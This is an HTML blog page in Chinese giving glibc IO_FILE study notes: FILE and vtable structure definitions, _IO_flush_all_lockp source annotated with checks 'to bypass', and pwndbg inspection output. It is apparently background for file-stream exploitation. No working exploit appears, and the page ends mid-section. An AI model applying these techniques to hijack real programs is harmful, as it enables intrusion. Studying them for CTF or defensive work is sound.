@@ -1,0 +1,1847 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="IO_FILE, Closure">
+    <meta name="description" content="IO_FILE:重要结构：_IO_FILE:struct _IO_FILE &amp;#123;
+  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */
+#de">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>IO_FILE | Closure</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+
+   <style>
+    body{
+       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
+       background-repeat:no-repeat;
+       background-size: 100% 100%;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Closure</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Closure</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/zh-Closure" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/zh-Closure" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/zh-Closure/images/main/202207191742694.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">IO_FILE</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/IO-FILE/">
+                                <span class="chip bg-color">IO_FILE</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-03-15
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO_FILE:"></a>IO_FILE:</h1><h2 id="重要结构："><a href="#重要结构：" class="headerlink" title="重要结构："></a>重要结构：</h2><h3 id="IO-FILE-1"><a href="#IO-FILE-1" class="headerlink" title="_IO_FILE:"></a>_IO_FILE:</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>        <span class="token comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_file_flags</span> <span class="token expression">_flags</span></span>
+
+  <span class="token comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>
+  <span class="token comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
+  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_ptr<span class="token punctuation">;</span>    <span class="token comment">/* Current read pointer */</span>
+  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_end<span class="token punctuation">;</span>    <span class="token comment">/* End of get area. */</span>
+  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_base<span class="token punctuation">;</span>    <span class="token comment">/* Start of putback+get area. */</span>
+  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_base<span class="token punctuation">;</span>    <span class="token comment">/* Start of put area. */</span>
+  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_ptr<span class="token punctuation">;</span>    <span class="token comment">/* Current put pointer. */</span>
+  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_end<span class="token punctuation">;</span>    <span class="token comment">/* End of put area. */</span>
+  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_base<span class="token punctuation">;</span>    <span class="token comment">/* Start of reserve area. */</span>
+  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_end<span class="token punctuation">;</span>    <span class="token comment">/* End of reserve area. */</span>
+  <span class="token comment">/* The following fields are used to support backing up and undo. */</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span> <span class="token comment">/* Pointer to start of non-current get area. */</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>  <span class="token comment">/* Pointer to first valid character of backup area */</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span> <span class="token comment">/* Pointer to end of non-current get area. */</span>
+
+  <span class="token keyword">struct</span> <span class="token class-name">_IO_marker</span> <span class="token operator">*</span>_markers<span class="token punctuation">;</span>
+
+  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_chain<span class="token punctuation">;</span>  <span class="token comment">//链表的指针域</span>
+
+  <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>
+  <span class="token keyword">int</span> _blksize<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>
+  <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+  _IO_off_t _old_offset<span class="token punctuation">;</span> <span class="token comment">/* This used to be _offset but it's too small.  */</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__HAVE_COLUMN</span> <span class="token comment">/* temporary */</span></span>
+  <span class="token comment">/* 1+column number of pbase(); 0 is unknown. */</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>
+  <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>
+  <span class="token keyword">char</span> _shortbuf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+  <span class="token comment">/*  char* _save_gptr;  char* _save_egptr; */</span>
+
+  _IO_lock_t <span class="token operator">*</span>_lock<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_USE_OLD_IO_FILE</span></span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>
+
+
+
+<h3 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus:"></a>_IO_FILE_plus:</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span>
+<span class="token punctuation">&#123;</span>
+    _IO_FILE    file<span class="token punctuation">;</span>
+    IO_jump_t   <span class="token operator">*</span>vtable<span class="token punctuation">;</span><span class="token comment">//在_IO_FILE的基础上添加vtable对象</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<h3 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t:"></a>_IO_jump_t:</h3><p>&#x3D;&#x3D;》vtable&#x3D;&#x3D;》是一个虚表，存放着函数指针</p>
+<p>&#x3D;&#x3D;&#x3D;》gdb通过他的对象查看vtable实例</p>
+<pre class="language-none"><code class="language-none">p&#x2F;x *(struct _IO_jump_t*)_IO_list_all.vtable</code></pre>
+
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> __dummy<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> __dummy2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_finish_t<span class="token punctuation">,</span> __finish<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">,</span> __overflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __underflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __uflow<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_pbackfail_t<span class="token punctuation">,</span> __pbackfail<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">/* showmany */</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsputn_t<span class="token punctuation">,</span> __xsputn<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsgetn_t<span class="token punctuation">,</span> __xsgetn<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekoff_t<span class="token punctuation">,</span> __seekoff<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekpos_t<span class="token punctuation">,</span> __seekpos<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_setbuf_t<span class="token punctuation">,</span> __setbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_sync_t<span class="token punctuation">,</span> __sync<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_doallocate_t<span class="token punctuation">,</span> __doallocate<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_read_t<span class="token punctuation">,</span> __read<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_write_t<span class="token punctuation">,</span> __write<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seek_t<span class="token punctuation">,</span> __seek<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_close_t<span class="token punctuation">,</span> __close<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_stat_t<span class="token punctuation">,</span> __stat<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_showmanyc_t<span class="token punctuation">,</span> __showmanyc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_imbue_t<span class="token punctuation">,</span> __imbue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>
+    get_column<span class="token punctuation">;</span>
+    set_column<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>
+
+
+
+<h3 id="IO-flush-all-lockp"><a href="#IO-flush-all-lockp" class="headerlink" title="_IO_flush_all_lockp:"></a>_IO_flush_all_lockp:</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">_IO_flush_all_lockp</span> <span class="token punctuation">(</span><span class="token keyword">int</span> do_lock<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_MTSAFE_IO</span></span>
+  <span class="token function">_IO_cleanup_region_start_noarg</span> <span class="token punctuation">(</span>flush_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">_IO_lock_lock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span> _IO_list_all<span class="token punctuation">;</span> fp <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> fp <span class="token operator">=</span> fp<span class="token operator">-></span>_chain<span class="token punctuation">)</span><span class="token comment">//遍历_IO_list_all</span>
+    <span class="token punctuation">&#123;</span>
+      run_fp <span class="token operator">=</span> fp<span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
+        <span class="token function">_IO_flockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token comment">/*一些检查，需要绕过*/</span>
+           <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
+               <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_mode <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_ptr
+                                    <span class="token operator">></span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+           <span class="token punctuation">)</span>
+          <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token comment">/* 选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/</span>
+        result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>do_lock<span class="token punctuation">)</span>
+        <span class="token function">_IO_funlockfile</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      run_fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_MTSAFE_IO</span></span>
+  <span class="token function">_IO_lock_unlock</span> <span class="token punctuation">(</span>list_all_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">_IO_cleanup_region_end</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<h3 id="IO-list-all"><a href="#IO-list-all" class="headerlink" title="_IO_list_all:"></a>_IO_list_all:</h3><p>gdb查看：</p>
+<pre class="language-none"><code class="language-none">p&#x2F;x *(struct _IO_FILE_plus*)_IO_list_all</code></pre>
+
+<pre class="language-c" data-language="c"><code class="language-c">pwndbg<span class="token operator">></span> p <span class="token operator">/</span>x <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span><span class="token operator">*</span><span class="token punctuation">)</span>_IO_list_all
+$<span class="token number">2</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  file <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    _flags <span class="token operator">=</span> <span class="token number">0xfbad2086</span><span class="token punctuation">,</span> 
+    _IO_read_ptr <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _IO_read_end <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _IO_read_base <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _IO_write_base <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _IO_write_ptr <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _IO_write_end <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _IO_buf_base <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _IO_buf_end <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _IO_save_base <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _IO_backup_base <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _IO_save_end <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _markers <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _chain <span class="token operator">=</span> <span class="token number">0x7ffff7dd2620</span><span class="token punctuation">,</span> 
+    _fileno <span class="token operator">=</span> <span class="token number">0x2</span><span class="token punctuation">,</span> 
+    _flags2 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _old_offset <span class="token operator">=</span> <span class="token number">0xffffffffffffffff</span><span class="token punctuation">,</span> 
+    _cur_column <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _vtable_offset <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _shortbuf <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> 
+    _lock <span class="token operator">=</span> <span class="token number">0x7ffff7dd3770</span><span class="token punctuation">,</span> 
+    _offset <span class="token operator">=</span> <span class="token number">0xffffffffffffffff</span><span class="token punctuation">,</span> 
+    _codecvt <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _wide_data <span class="token operator">=</span> <span class="token number">0x7ffff7dd1660</span><span class="token punctuation">,</span> 
+    _freeres_list <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _freeres_buf <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    __pad5 <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _mode <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+    _unused2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x0</span> <span class="token operator">&lt;</span>repeats <span class="token number">20</span> times<span class="token operator">></span><span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> 
+  vtable <span class="token operator">=</span> <span class="token number">0x7ffff7dd06e0</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220316164711002.png"></p>
+<h2 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h2><p>FILE在Linux系统的标准IO库使用来描述文件结构&#x3D;&#x3D;》文件流</p>
+<p>FILE结构在程序执行fopen函数时会自动创建，并分配到堆中&#x3D;&#x3D;》常定义一个指向FILE结构的指针来接收这个返回值</p>
+<h3 id="FILE结构源码："><a href="#FILE结构源码：" class="headerlink" title="FILE结构源码："></a>FILE结构源码：</h3><p>FILE&#x3D;&#x3D;》glibc&#x2F;libio&#x2F;libio.h(pwndbg&#x2F;glibc-2.23&#x2F;libio&#x2F;libio.h)&#x3D;&#x3D;》</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220316163947023.png" style="zoom: 50%;" />
+
+<p>&#x3D;&#x3D;》</p>
+<p>进程的FILE结构会通过_chain域彼此连接形成一个链表&#x3D;&#x3D;》</p>
+<p>链表头部使用全局变量_IO_LIST_ALL表示，通过这个值可以遍历所有FILE结构&#x3D;&#x3D;》</p>
